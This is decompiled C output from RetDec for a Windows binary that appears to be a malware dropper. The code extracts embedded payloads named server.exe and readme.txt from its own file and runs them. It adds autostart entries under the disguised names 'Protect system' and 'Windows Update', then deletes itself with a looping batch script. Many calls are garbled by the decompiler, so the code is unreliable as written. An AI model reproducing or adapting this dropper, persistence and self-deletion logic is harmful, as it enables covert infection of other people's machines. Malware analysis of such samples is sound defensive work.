//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
// Copyright (c) Retargetable Decompiler <info@retdec.com>
//

#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <windows.h>

// ------------------------ Structures ------------------------

struct _OVERLAPPED {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t * e3;
};

struct _SECURITY_ATTRIBUTES {
    int32_t e0;
    int32_t * e1;
    bool e2;
};

// ------------------- Function Prototypes --------------------

int32_t entry_point(void);
int32_t function_13141000(void);
int32_t function_1314105b(void);
int32_t function_1314105d(int32_t a1);
int32_t function_131414c1(void);
int32_t function_13141605(void);
int32_t function_1314170a(void);
int32_t function_13141711(void);
int32_t function_13141718(void);
int32_t function_1314171f(void);
bool function_1314175a(int32_t * hObject);
bool function_13141760(char * lpExistingFileName, char * lpNewFileName, bool bFailIfExists);
int32_t * function_13141766(char * lpFileName, int32_t dwDesiredAccess, int32_t dwShareMode, struct _SECURITY_ATTRIBUTES * lpSecurityAttributes, int32_t dwCreationDisposition, int32_t dwFlagsAndAttributes, int32_t * hTemplateFile);
bool function_1314176c(char * lpFileName);
void function_13141772(int32_t uExitCode);
int32_t function_13141778(int32_t nBufferLength, char * lpBuffer);
int32_t function_1314177e(int32_t * hFile, int32_t * lpFileSizeHigh);
int32_t function_13141784(int32_t * hModule, char * lpFilename, int32_t nSize);
int32_t * function_1314178a(void);
int32_t function_13141790(int32_t nBufferLength, char * lpBuffer);
int32_t * function_13141796(int32_t * hHeap, int32_t dwFlags, int32_t dwBytes);
bool function_1314179c(int32_t * hHeap, int32_t dwFlags, int32_t * lpMem);
bool function_131417a2(int32_t * hFile, int32_t * lpBuffer, int32_t nNumberOfBytesToRead, int32_t * lpNumberOfBytesRead, struct _OVERLAPPED * lpOverlapped);
void function_131417a8(int32_t * Destination, int32_t Length);
int32_t function_131417ae(int32_t * hFile, int32_t lDistanceToMove, int32_t * lpDistanceToMoveHigh, int32_t dwMoveMethod);
int32_t function_131417b4(char * lpCmdLine, int32_t uCmdShow);
bool function_131417ba(int32_t * hFile, int32_t * lpBuffer, int32_t nNumberOfBytesToWrite, int32_t * lpNumberOfBytesWritten, struct _OVERLAPPED * lpOverlapped);
int32_t function_131417c0(int32_t hFile);
int32_t function_131417c6(int32_t hFile, int32_t lOffset, int32_t iOrigin);
int32_t function_131417cc(char * lpPathName, int32_t iReadWrite);
int32_t function_131417d2(int32_t hFile, int32_t * lpBuffer, int32_t uBytes);
char * function_131417d8(char * lpString1, char * lpString2);
int32_t function_131417de(char * lpString1, char * lpString2);
char * function_131417e4(char * lpString1, char * lpString2);
int32_t function_131417ea(char * lpString);
int32_t * function_131417f0(int32_t * hwnd, char * lpOperation, char * lpFile, char * lpParameters, char * lpDirectory, int32_t nShowCmd);
int32_t function_131417f6(int32_t * hKey);
int32_t function_131417fc(int32_t * hKey, char * lpSubKey, int32_t ulOptions, int32_t samDesired, int32_t ** phkResult);
int32_t function_13141802(int32_t * hKey, char * lpValueName, int32_t Reserved, int32_t dwType, char * lpData, int32_t cbData);

// --------------------- Global Variables ---------------------

int32_t g1 = 0; // 0x1314300b
int32_t g2 = 0; // 0x1314301f
char g3[2] = "\\"; // 0x13143023
char g4 = 0; // 0x1314307d
int32_t g5 = 0; // 0x1314307e
int32_t g6 = 1; // 0x1314308a
int32_t g7 = 253; // 0x1314308e
int32_t g8 = 1; // 0x13143092
int32_t g9 = 253; // 0x13143096
int32_t g10 = 0; // 0x1314309a
char g11 = 0; // 0x131430f8
int32_t g12 = 0; // 0x131434f8
int32_t g13 = 0; // 0x13143548
int32_t g14 = 0; // 0x131435e8
int32_t g15 = 0; // 0x131435ec
int32_t g16 = 0; // 0x13143614
int32_t g17 = 0; // 0x13143618
char * g18; // 0x13143a1c
char * g19; // 0x13143b1c
char * g20; // 0x13143c1c
char * g21; // 0x13143d1c
int32_t g22 = 0; // 0x13143e1c
int32_t g23 = 0; // 0x13143e20
int32_t g24 = 0; // 0x13143e70
int32_t g25 = 0; // 0x13143ec0
int32_t g26 = 0; // 0x13143f10
char * g27; // 0x13143f24
int32_t g28 = 0; // 0x13144028
int32_t g29;

// ------------------------ Functions -------------------------

// Address range: 0x13141000 - 0x13141008
int32_t function_13141000(void) {
    // 0x13141000
    int32_t v1; // 0x13141000
    return function_1314105d(v1);
}

// Address range: 0x1314105b - 0x1314105d
int32_t function_1314105b(void) {
    // 0x1314105b
    int32_t result; // 0x1314105b
    return result;
}

// Address range: 0x1314105d - 0x131411e7
int32_t function_1314105d(int32_t a1) {
    int32_t * hHeap = GetProcessHeap(); // 0x1314105d
    int32_t v1; // 0x1314105d
    int32_t * v2 = (int32_t *)(v1 - 12); // 0x13141062
    *v2 = (int32_t)hHeap;
    int32_t v3 = (int32_t)HeapAlloc(hHeap, 0, 2040); // 0x1314106f
    int32_t * lpString1 = (int32_t *)(v1 - 20); // 0x13141074
    *lpString1 = v3 + 260;
    int32_t * lpFilename = (int32_t *)(v1 - 16); // 0x13141084
    *lpFilename = v3 + 520;
    int32_t * lpBuffer = (int32_t *)(v1 - 24); // 0x1314108c
    *lpBuffer = v3 + 780;
    int32_t * lpString1_ = (int32_t *)(v1 - 28); // 0x13141094
    *lpString1_ = v3 + 1040;
    GetTempPathA(260, (char *)*lpBuffer);
    lstrcatA((char *)*lpBuffer, "DelUS.bat");
    char * lpFileName = (char *)*lpBuffer; // 0x131410c3
    char * v4 = lpFileName; // bp-56, 0x131410c3
    int32_t * fileHandle = CreateFileA(lpFileName, 0x40000000, 0, NULL, 2, 0x8000080, NULL); // 0x131410c6
    int32_t * hFile = (int32_t *)(v1 - 4); // 0x131410cb
    *hFile = (int32_t)fileHandle;
    int32_t v5 = (int32_t)&v4; // 0x131410d2
    if (fileHandle != (int32_t *)-1) {
        // 0x131410d8
        GetModuleFileNameA(NULL, (char *)*lpFilename, 260);
        lstrcpyA((char *)*lpString1, (char *)*lpFilename);
        int32_t v6 = *lpString1; // 0x131410f2
        int32_t v7 = v6; // 0x131410f5
        char v8 = *(char *)v7; // 0x131410f7
        int32_t v9 = v8 != 92 ? v6 : v7;
        int32_t v10 = v9; // 0x13141102
        v7++;
        while (v8 != 0) {
            // 0x131410f7
            v8 = *(char *)v7;
            v9 = v8 != 92 ? v10 : v7;
            v10 = v9;
            v7++;
        }
        // 0x13141104
        *(char *)(v9 + 1) = 0;
        lstrcatA((char *)*lpString1_, ":Repeat\r\n");
        lstrcatA((char *)*lpString1_, "del \"");
        lstrcatA((char *)*lpString1_, (char *)*lpFilename);
        lstrcatA((char *)*lpString1_, "\"");
        lstrcatA((char *)*lpString1_, "\r\nif exist \"");
        lstrcatA((char *)*lpString1_, (char *)*lpFilename);
        lstrcatA((char *)*lpString1_, "\" goto Repeat\r\n");
        lstrcatA((char *)*lpString1_, "rmdir \"");
        lstrcatA((char *)*lpString1_, (char *)*lpString1);
        lstrcatA((char *)*lpString1_, "\"\r\ndel \"");
        lstrcatA((char *)*lpString1_, (char *)*lpBuffer);
        lstrcatA((char *)*lpString1_, "\"\r\n");
        int32_t nNumberOfBytesToWrite = lstrlenA((char *)*lpString1_); // 0x1314119f
        int32_t * lpNumberOfBytesWritten = (int32_t *)(v1 - 8); // 0x131411a4
        *lpNumberOfBytesWritten = nNumberOfBytesToWrite;
        WriteFile((int32_t *)*hFile, (int32_t *)*lpString1_, nNumberOfBytesToWrite, lpNumberOfBytesWritten, NULL);
        CloseHandle((int32_t *)*hFile);
        int32_t v11 = 0; // bp-224, 0x131411d1
        ShellExecuteA(NULL, "open", (char *)*lpBuffer, NULL, NULL, 0);
        v5 = &v11;
    }
    // 0x131411d8
    *(int32_t *)(v5 - 4) = *lpString1;
    *(int32_t *)(v5 - 8) = 0;
    *(int32_t *)(v5 - 12) = *v2;
    return HeapFree(&g29, (int32_t)&g29, &g29);
}

// Address range: 0x131411e7 - 0x131414c1
int32_t entry_point(void) {
    // 0x131411e7
    GetCurrentDirectoryA(256, (char *)&g19);
    GetTempPathA(256, (char *)&g20);
    GetTempPathA(256, (char *)&g21);
    lstrcatA((char *)&g19, g3);
    lstrcatA((char *)&g19, "server.exe");
    lstrcatA((char *)&g20, "readme.txt");
    lstrcatA((char *)&g21, "server.exe");
    DeleteFileA((char *)&g19);
    DeleteFileA((char *)&g20);
    DeleteFileA((char *)&g21);
    int32_t v1 = 0; // bp-80, 0x13141278
    GetModuleFileNameA(NULL, (char *)&g18, 256);
    g12 = 0x1964;
    function_13141605();
    g23 = g12;
    g12 = 0x2710;
    function_13141605();
    g24 = g12;
    g25 = g12 - 8;
    g22 = 1;
    function_131414c1();
    int32_t * v2 = &v1; // 0x131412d9
    if (g6 == 1) {
        // 0x131412df
        RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, 0x20006, (int32_t **)&g28);
        int32_t * hKey = (int32_t *)g28;
        int32_t v3; // bp-128, 0x131411e7
        if (g10 == 1) {
            // 0x1314132e
            RegSetValueExA(hKey, "Protect system", 0, 1, (char *)&g19, 161);
            v3 = g28;
            RegCloseKey((int32_t *)g28);
            v2 = &v3;
        } else {
            // 0x131412e8
            RegSetValueExA(hKey, "Protect system", 0, 1, (char *)&g21, 161);
            v3 = g28;
            RegCloseKey((int32_t *)g28);
            v2 = &v3;
        }
    }
    int32_t v4 = (int32_t)v2;
    *(int32_t *)(v4 - 4) = 0;
    *(int32_t *)(v4 - 8) = (int32_t)&g21;
    int32_t v5 = v4 - 12; // 0x13141379
    *(int32_t *)v5 = (int32_t)&g19;
    CopyFileA((char *)&g29, (char *)&g29, (bool)&g29);
    int32_t v6 = v5; // 0x1314138a
    if (g10 == 0) {
        // 0x1314138c
        v6 = v4 - 16;
        *(int32_t *)v6 = (int32_t)&g19;
        DeleteFileA((char *)&g29);
    }
    int32_t v7 = v6; // 0x1314139d
    if (g8 == 1) {
        // 0x131413a3
        function_1314171f();
        *(int32_t *)(v6 - 4) = (int32_t)"exe";
        *(int32_t *)(v6 - 8) = (int32_t)&g27;
        int32_t v8 = lstrcmpiA((char *)&g29, (char *)&g29); // 0x131413b2
        *(int32_t *)(v6 - 12) = 5;
        int32_t v9 = v6 - 16;
        int32_t * v10 = (int32_t *)v9;
        if (v8 == 0) {
            // 0x131413d4
            *v10 = (int32_t)&g21;
            WinExec((char *)&g29, (int32_t)&g29);
            v7 = v9;
        } else {
            // 0x131413bb
            *v10 = 0;
            *(int32_t *)(v6 - 20) = 0;
            *(int32_t *)(v6 - 24) = (int32_t)&g21;
            *(int32_t *)(v6 - 28) = (int32_t)"open";
            int32_t v11 = v6 - 32; // 0x131413cb
            *(int32_t *)v11 = 0;
            ShellExecuteA(&g29, (char *)&g29, (char *)&g29, (char *)&g29, (char *)&g29, (int32_t)&g29);
            v7 = v11;
        }
    }
    // 0x131413e0
    g22 = 2;
    function_131414c1();
    int32_t v12 = v7; // 0x131413f6
    if (g7 == 1) {
        // 0x131413f8
        *(int32_t *)(v7 - 4) = (int32_t)&g28;
        *(int32_t *)(v7 - 8) = 0x20006;
        *(int32_t *)(v7 - 12) = 0;
        *(int32_t *)(v7 - 16) = (int32_t)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        *(int32_t *)(v7 - 20) = -0x7ffffffe;
        RegOpenKeyExA(&g29, (char *)&g29, (int32_t)&g29, (int32_t)&g29, (int32_t **)&g29);
        *(int32_t *)(v7 - 24) = 161;
        *(int32_t *)(v7 - 28) = (int32_t)&g20;
        *(int32_t *)(v7 - 32) = 1;
        *(int32_t *)(v7 - 36) = 0;
        *(int32_t *)(v7 - 40) = (int32_t)"Windows Update";
        *(int32_t *)(v7 - 44) = g28;
        RegSetValueExA(&g29, (char *)&g29, (int32_t)&g29, (int32_t)&g29, (char *)&g29, (int32_t)&g29);
        v12 = v7 - 48;
        *(int32_t *)v12 = g28;
        RegCloseKey(&g29);
    }
    // 0x1314143c
    if (g9 != 1) {
        // 0x13141445
        if (g10 == 1) {
            // 0x1314144e
            function_13141000();
        }
        // 0x13141453
        *(int32_t *)(v12 - 4) = 0;
        ExitProcess((int32_t)&g29);
        // UNREACHABLE
    }
    // 0x1314145c
    function_1314171f();
    *(int32_t *)(v12 - 4) = (int32_t)"exe";
    *(int32_t *)(v12 - 8) = (int32_t)&g27;
    int32_t v13 = lstrcmpiA((char *)&g29, (char *)&g29); // 0x1314146b
    *(int32_t *)(v12 - 12) = 5;
    int32_t * v14 = (int32_t *)(v12 - 16);
    if (v13 == 0) {
        // 0x131414a0
        *v14 = (int32_t)&g20;
        WinExec((char *)&g29, (int32_t)&g29);
        if (g10 == 1) {
            // 0x131414b5
            function_13141000();
        }
        // 0x131414ba
        *(int32_t *)(v12 - 20) = 0;
        ExitProcess((int32_t)&g29);
        return &g29;
    }
    // 0x13141474
    *v14 = 0;
    *(int32_t *)(v12 - 20) = 0;
    *(int32_t *)(v12 - 24) = (int32_t)&g20;
    *(int32_t *)(v12 - 28) = (int32_t)"open";
    *(int32_t *)(v12 - 32) = 0;
    ShellExecuteA(&g29, (char *)&g29, (char *)&g29, (char *)&g29, (char *)&g29, (int32_t)&g29);
    if (g10 == 1) {
        // 0x13141494
        function_13141000();
    }
    // 0x13141499
    *(int32_t *)(v12 - 36) = 0;
    ExitProcess((int32_t)&g29);
    // UNREACHABLE
}

// Address range: 0x131414c1 - 0x13141605
int32_t function_131414c1(void) {
    // 0x131414c1
    int32_t v1; // 0x131414c1
    int32_t v2; // 0x131414c1
    if (g22 == 1) {
        char * v3 = (char *)&g19; // bp-28, 0x131414dc
        int32_t * fileHandle = CreateFileA((char *)&g19, 0x40000000, 1, NULL, 2, 128, NULL); // 0x131414e1
        g16 = (int32_t)fileHandle;
        g12 = g23;
        v1 = g23;
        v2 = (int32_t)&v3;
    }
    // 0x131414f5
    int32_t v4; // 0x131414c1
    int32_t result; // 0x131414c1
    int32_t v5; // 0x131414c1
    if (g22 != 2) {
        // 0x131414f5
        v4 = g16;
        result = v1;
        v5 = v2;
    } else {
        char * v6 = (char *)&g20; // bp-56, 0x13141510
        int32_t fileHandle2 = (int32_t)CreateFileA((char *)&g20, 0x40000000, 1, NULL, 1, 128, NULL); // 0x13141515
        g16 = fileHandle2;
        g12 = g24;
        v4 = fileHandle2;
        result = g24;
        v5 = (int32_t)&v6;
    }
    // 0x13141529
    if (v4 == -1) {
        // 0x13141532
        return result;
    }
    // 0x13141533
    *(int32_t *)(v5 - 4) = 2;
    *(int32_t *)(v5 - 8) = 0;
    *(int32_t *)(v5 - 12) = 0;
    *(int32_t *)(v5 - 16) = g16;
    SetFilePointer(&g29, (int32_t)&g29, &g29, (int32_t)&g29);
    *(int32_t *)(v5 - 20) = 0;
    *(int32_t *)(v5 - 24) = (int32_t)&g18;
    int32_t v7 = _lopen((char *)&g29, (int32_t)&g29); // 0x1314154b
    if (v7 == -1) {
        // 0x13141532
        return -1;
    }
    // 0x13141559
    g5 = v7;
    *(int32_t *)(v5 - 28) = 0;
    *(int32_t *)(v5 - 32) = 0;
    *(int32_t *)(v5 - 36) = g12;
    int32_t v8 = v5 - 40; // 0x13141568
    *(int32_t *)v8 = g5;
    SetFilePointer(&g29, (int32_t)&g29, &g29, (int32_t)&g29);
    int32_t v9 = v8;
    *(int32_t *)(v9 - 4) = 1;
    *(int32_t *)(v9 - 8) = 0;
    *(int32_t *)(v9 - 12) = g5;
    int32_t v10 = _llseek((int32_t)&g29, (int32_t)&g29, (int32_t)&g29); // 0x1314157d
    if (g22 == 1) {
        // 0x1314158b
        if (v10 == g25) {
            // 0x13141593
            *(int32_t *)(v9 - 16) = g16;
            CloseHandle(&g29);
            *(int32_t *)(v9 - 20) = g5;
            return _lclose((int32_t)&g29);
        }
    }
    // 0x131415aa
    *(int32_t *)(v9 - 16) = 1;
    *(int32_t *)(v9 - 20) = (int32_t)&g4;
    *(int32_t *)(v9 - 24) = g5;
    int32_t v11 = _lread((int32_t)&g29, &g29, (int32_t)&g29); // 0x131415b7
    while (v11 != 0) {
        // 0x13141573
        g26 = v11;
        // 0x131415e1
        function_13141711();
        *(int32_t *)(v9 - 28) = 0;
        *(int32_t *)(v9 - 32) = (int32_t)&g17;
        *(int32_t *)(v9 - 36) = 1;
        *(int32_t *)(v9 - 40) = (int32_t)&g4;
        int32_t v12 = v9 - 44; // 0x131415f4
        *(int32_t *)v12 = g16;
        WriteFile(&g29, &g29, (int32_t)&g29, &g29, (struct _OVERLAPPED *)&g29);
        v9 = v12;
        *(int32_t *)(v9 - 4) = 1;
        *(int32_t *)(v9 - 8) = 0;
        *(int32_t *)(v9 - 12) = g5;
        v10 = _llseek((int32_t)&g29, (int32_t)&g29, (int32_t)&g29);
        if (g22 == 1) {
            // 0x1314158b
            if (v10 == g25) {
                // 0x13141593
                *(int32_t *)(v9 - 16) = g16;
                CloseHandle(&g29);
                *(int32_t *)(v9 - 20) = g5;
                return _lclose((int32_t)&g29);
            }
        }
        // 0x131415aa
        *(int32_t *)(v9 - 16) = 1;
        *(int32_t *)(v9 - 20) = (int32_t)&g4;
        *(int32_t *)(v9 - 24) = g5;
        v11 = _lread((int32_t)&g29, &g29, (int32_t)&g29);
    }
    // 0x131415ca
    *(int32_t *)(v9 - 28) = g16;
    CloseHandle(&g29);
    *(int32_t *)(v9 - 32) = g5;
    return _lclose((int32_t)&g29);
}

// Address range: 0x13141605 - 0x1314170a
int32_t function_13141605(void) {
    int32_t hFile = _lopen((char *)&g18, 0); // 0x1314160c
    if (g14 == -1) {
        // 0x13141703
        ExitProcess(0);
        // UNREACHABLE
    }
    // 0x1314161e
    g14 = hFile;
    *(int16_t *)&g1 = 1;
    int32_t v1 = hFile; // bp-16, 0x1314162e
    int32_t v2 = GetFileSize((int32_t *)hFile, NULL); // 0x13141634
    g15 = v2;
    int32_t result = g12 + 1; // 0x1314163e
    g12 = result;
    if (result < v2 != result != 0) {
        // 0x13141651
        return result;
    }
    int32_t v3 = &v1;
    *(int32_t *)(v3 - 4) = 0;
    *(int32_t *)(v3 - 8) = 0;
    *(int32_t *)(v3 - 12) = g12;
    *(int32_t *)(v3 - 16) = g14;
    SetFilePointer(&g29, (int32_t)&g29, &g29, (int32_t)&g29);
    *(int32_t *)(v3 - 20) = 0;
    *(int32_t *)(v3 - 24) = (int32_t)&g2;
    *(int32_t *)(v3 - 28) = 4;
    *(int32_t *)(v3 - 32) = (int32_t)&g13;
    int32_t v4 = v3 - 36; // 0x1314167a
    *(int32_t *)v4 = g14;
    ReadFile(&g29, &g29, (int32_t)&g29, &g29, (struct _OVERLAPPED *)&g29);
    int32_t v5 = v4; // 0x1314168f
    if (g13 == 0x696e6966) {
        // 0x13141691
        g12 += 4;
        *(int32_t *)(v3 - 40) = 0;
        *(int32_t *)(v3 - 44) = (int32_t)&g2;
        *(int32_t *)(v3 - 48) = 4;
        *(int32_t *)(v3 - 52) = (int32_t)&g13;
        v5 = v3 - 56;
        *(int32_t *)v5 = g14;
        ReadFile(&g29, &g29, (int32_t)&g29, &g29, (struct _OVERLAPPED *)&g29);
        if (g13 == 0x696e6966) {
            // 0x131416ce
            *(int32_t *)(v3 - 60) = 120;
            *(int32_t *)(v3 - 64) = (int32_t)&g13;
            RtlZeroMemory(&g29, (int32_t)&g29);
            g12 += 4;
            *(int32_t *)(v3 - 68) = g14;
            return CloseHandle(&g29);
        }
    }
    int32_t result2 = g12 + 1; // 0x1314163e
    g12 = result2;
    while (result2 < g15 == (result2 != 0)) {
        // 0x13141657
        v3 = v5;
        *(int32_t *)(v3 - 4) = 0;
        *(int32_t *)(v3 - 8) = 0;
        *(int32_t *)(v3 - 12) = g12;
        *(int32_t *)(v3 - 16) = g14;
        SetFilePointer(&g29, (int32_t)&g29, &g29, (int32_t)&g29);
        *(int32_t *)(v3 - 20) = 0;
        *(int32_t *)(v3 - 24) = (int32_t)&g2;
        *(int32_t *)(v3 - 28) = 4;
        *(int32_t *)(v3 - 32) = (int32_t)&g13;
        v4 = v3 - 36;
        *(int32_t *)v4 = g14;
        ReadFile(&g29, &g29, (int32_t)&g29, &g29, (struct _OVERLAPPED *)&g29);
        v5 = v4;
        if (g13 == 0x696e6966) {
            // 0x13141691
            g12 += 4;
            *(int32_t *)(v3 - 40) = 0;
            *(int32_t *)(v3 - 44) = (int32_t)&g2;
            *(int32_t *)(v3 - 48) = 4;
            *(int32_t *)(v3 - 52) = (int32_t)&g13;
            v5 = v3 - 56;
            *(int32_t *)v5 = g14;
            ReadFile(&g29, &g29, (int32_t)&g29, &g29, (struct _OVERLAPPED *)&g29);
            if (g13 == 0x696e6966) {
                // 0x131416ce
                *(int32_t *)(v3 - 60) = 120;
                *(int32_t *)(v3 - 64) = (int32_t)&g13;
                RtlZeroMemory(&g29, (int32_t)&g29);
                g12 += 4;
                *(int32_t *)(v3 - 68) = g14;
                return CloseHandle(&g29);
            }
        }
        // 0x131416fe
        result2 = g12 + 1;
        g12 = result2;
    }
    // 0x13141651
    return result2;
}

// Address range: 0x1314170a - 0x13141711
int32_t function_1314170a(void) {
    // 0x1314170a
    ExitProcess(0);
    return &g29;
}

// Address range: 0x13141711 - 0x13141718
int32_t function_13141711(void) {
    // 0x13141711
    g4--;
    int32_t result; // 0x13141711
    return result;
}

// Address range: 0x13141718 - 0x1314171f
int32_t function_13141718(void) {
    // 0x13141718
    g11--;
    int32_t result; // 0x13141718
    return result;
}

// Address range: 0x1314171f - 0x13141759
int32_t function_1314171f(void) {
    int32_t v1 = g22 != 1 ? (int32_t)&g20 : (int32_t)&g19;
    char v2 = *(char *)v1; // 0x1314173a
    bool v3; // 0x1314171f
    int32_t v4 = v3 ? -1 : 1; // 0x1314173a
    int32_t v5 = v1; // 0x1314173d
    int32_t v6 = v1; // 0x1314173d
    int32_t v7 = v1; // 0x1314173d
    if (v2 != 0) {
        v6 += v4;
        v7 = v2 != 46 ? v7 : v6;
        char v8 = *(char *)v6; // 0x1314173a
        v5 = v7;
        while (v8 != 0) {
            // 0x1314173f
            v6 += v4;
            v7 = v8 != 46 ? v7 : v6;
            v8 = *(char *)v6;
            v5 = v7;
        }
    }
    int32_t v9 = v5; // 0x1314171f
    int32_t v10 = (int32_t)&g27; // 0x1314171f
    char v11 = *(char *)v9; // 0x1314174e
    *(char *)v10 = v11;
    v9 += v4;
    v10 += v4;
    while (v11 != 0) {
        // 0x1314174e
        v11 = *(char *)v9;
        *(char *)v10 = v11;
        v9 += v4;
        v10 += v4;
    }
    // 0x13141754
    int32_t result; // 0x1314171f
    return result;
}

// Address range: 0x1314175a - 0x13141760
bool function_1314175a(int32_t * hObject) {
    // 0x1314175a
    return CloseHandle(hObject);
}

// Address range: 0x13141760 - 0x13141766
bool function_13141760(char * lpExistingFileName, char * lpNewFileName, bool bFailIfExists) {
    // 0x13141760
    return CopyFileA(lpExistingFileName, lpNewFileName, bFailIfExists);
}

// Address range: 0x13141766 - 0x1314176c
int32_t * function_13141766(char * lpFileName, int32_t dwDesiredAccess, int32_t dwShareMode, struct _SECURITY_ATTRIBUTES * lpSecurityAttributes, int32_t dwCreationDisposition, int32_t dwFlagsAndAttributes, int32_t * hTemplateFile) {
    // 0x13141766
    return CreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
}

// Address range: 0x1314176c - 0x13141772
bool function_1314176c(char * lpFileName) {
    // 0x1314176c
    return DeleteFileA(lpFileName);
}

// Address range: 0x13141772 - 0x13141778
void function_13141772(int32_t uExitCode) {
    // 0x13141772
    ExitProcess(uExitCode);
}

// Address range: 0x13141778 - 0x1314177e
int32_t function_13141778(int32_t nBufferLength, char * lpBuffer) {
    // 0x13141778
    return GetCurrentDirectoryA(nBufferLength, lpBuffer);
}

// Address range: 0x1314177e - 0x13141784
int32_t function_1314177e(int32_t * hFile, int32_t * lpFileSizeHigh) {
    // 0x1314177e
    return GetFileSize(hFile, lpFileSizeHigh);
}

// Address range: 0x13141784 - 0x1314178a
int32_t function_13141784(int32_t * hModule, char * lpFilename, int32_t nSize) {
    // 0x13141784
    return GetModuleFileNameA(hModule, lpFilename, nSize);
}

// Address range: 0x1314178a - 0x13141790
int32_t * function_1314178a(void) {
    // 0x1314178a
    return GetProcessHeap();
}

// Address range: 0x13141790 - 0x13141796
int32_t function_13141790(int32_t nBufferLength, char * lpBuffer) {
    // 0x13141790
    return GetTempPathA(nBufferLength, lpBuffer);
}

// Address range: 0x13141796 - 0x1314179c
int32_t * function_13141796(int32_t * hHeap, int32_t dwFlags, int32_t dwBytes) {
    // 0x13141796
    return HeapAlloc(hHeap, dwFlags, dwBytes);
}

// Address range: 0x1314179c - 0x131417a2
bool function_1314179c(int32_t * hHeap, int32_t dwFlags, int32_t * lpMem) {
    // 0x1314179c
    return HeapFree(hHeap, dwFlags, lpMem);
}

// Address range: 0x131417a2 - 0x131417a8
bool function_131417a2(int32_t * hFile, int32_t * lpBuffer, int32_t nNumberOfBytesToRead, int32_t * lpNumberOfBytesRead, struct _OVERLAPPED * lpOverlapped) {
    // 0x131417a2
    return ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);
}

// Address range: 0x131417a8 - 0x131417ae
void function_131417a8(int32_t * Destination, int32_t Length) {
    // 0x131417a8
    RtlZeroMemory(Destination, Length);
}

// Address range: 0x131417ae - 0x131417b4
int32_t function_131417ae(int32_t * hFile, int32_t lDistanceToMove, int32_t * lpDistanceToMoveHigh, int32_t dwMoveMethod) {
    // 0x131417ae
    return SetFilePointer(hFile, lDistanceToMove, lpDistanceToMoveHigh, dwMoveMethod);
}

// Address range: 0x131417b4 - 0x131417ba
int32_t function_131417b4(char * lpCmdLine, int32_t uCmdShow) {
    // 0x131417b4
    return WinExec(lpCmdLine, uCmdShow);
}

// Address range: 0x131417ba - 0x131417c0
bool function_131417ba(int32_t * hFile, int32_t * lpBuffer, int32_t nNumberOfBytesToWrite, int32_t * lpNumberOfBytesWritten, struct _OVERLAPPED * lpOverlapped) {
    // 0x131417ba
    return WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
}

// Address range: 0x131417c0 - 0x131417c6
int32_t function_131417c0(int32_t hFile) {
    // 0x131417c0
    return _lclose(hFile);
}

// Address range: 0x131417c6 - 0x131417cc
int32_t function_131417c6(int32_t hFile, int32_t lOffset, int32_t iOrigin) {
    // 0x131417c6
    return _llseek(hFile, lOffset, iOrigin);
}

// Address range: 0x131417cc - 0x131417d2
int32_t function_131417cc(char * lpPathName, int32_t iReadWrite) {
    // 0x131417cc
    return _lopen(lpPathName, iReadWrite);
}

// Address range: 0x131417d2 - 0x131417d8
int32_t function_131417d2(int32_t hFile, int32_t * lpBuffer, int32_t uBytes) {
    // 0x131417d2
    return _lread(hFile, lpBuffer, uBytes);
}

// Address range: 0x131417d8 - 0x131417de
char * function_131417d8(char * lpString1, char * lpString2) {
    // 0x131417d8
    return lstrcatA(lpString1, lpString2);
}

// Address range: 0x131417de - 0x131417e4
int32_t function_131417de(char * lpString1, char * lpString2) {
    // 0x131417de
    return lstrcmpiA(lpString1, lpString2);
}

// Address range: 0x131417e4 - 0x131417ea
char * function_131417e4(char * lpString1, char * lpString2) {
    // 0x131417e4
    return lstrcpyA(lpString1, lpString2);
}

// Address range: 0x131417ea - 0x131417f0
int32_t function_131417ea(char * lpString) {
    // 0x131417ea
    return lstrlenA(lpString);
}

// Address range: 0x131417f0 - 0x131417f6
int32_t * function_131417f0(int32_t * hwnd, char * lpOperation, char * lpFile, char * lpParameters, char * lpDirectory, int32_t nShowCmd) {
    // 0x131417f0
    return ShellExecuteA(hwnd, lpOperation, lpFile, lpParameters, lpDirectory, nShowCmd);
}

// Address range: 0x131417f6 - 0x131417fc
int32_t function_131417f6(int32_t * hKey) {
    // 0x131417f6
    return RegCloseKey(hKey);
}

// Address range: 0x131417fc - 0x13141802
int32_t function_131417fc(int32_t * hKey, char * lpSubKey, int32_t ulOptions, int32_t samDesired, int32_t ** phkResult) {
    // 0x131417fc
    return RegOpenKeyExA(hKey, lpSubKey, ulOptions, samDesired, phkResult);
}

// Address range: 0x13141802 - 0x13141808
int32_t function_13141802(int32_t * hKey, char * lpValueName, int32_t Reserved, int32_t dwType, char * lpData, int32_t cbData) {
    // 0x13141802
    return RegSetValueExA(hKey, lpValueName, Reserved, dwType, lpData, cbData);
}

// --------------- Dynamically Linked Functions ---------------

// HFILE _lclose(_In_ HFILE hFile);
// LONG _llseek(_In_ HFILE hFile, _In_ LONG lOffset, _In_ int iOrigin);
// HFILE _lopen(_In_ LPCSTR lpPathName, _In_ int iReadWrite);
// UINT _lread(_In_ HFILE hFile, LPVOID lpBuffer, _In_ UINT uBytes);
// BOOL CloseHandle(_In_ HANDLE hObject);
// BOOL CopyFileA(_In_ LPCSTR lpExistingFileName, _In_ LPCSTR lpNewFileName, _In_ BOOL bFailIfExists);
// HANDLE CreateFileA(_In_ LPCSTR lpFileName, _In_ DWORD dwDesiredAccess, _In_ DWORD dwShareMode, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, _In_ DWORD dwCreationDisposition, _In_ DWORD dwFlagsAndAttributes, _In_opt_ HANDLE hTemplateFile);
// BOOL DeleteFileA(_In_ LPCSTR lpFileName);
// VOID ExitProcess(_In_ UINT uExitCode);
// DWORD GetCurrentDirectoryA(_In_ DWORD nBufferLength, LPSTR lpBuffer);
// DWORD GetFileSize(_In_ HANDLE hFile, _Out_opt_ LPDWORD lpFileSizeHigh);
// DWORD GetModuleFileNameA(_In_opt_ HMODULE hModule, LPSTR lpFilename, _In_ DWORD nSize);
// HANDLE GetProcessHeap(VOID);
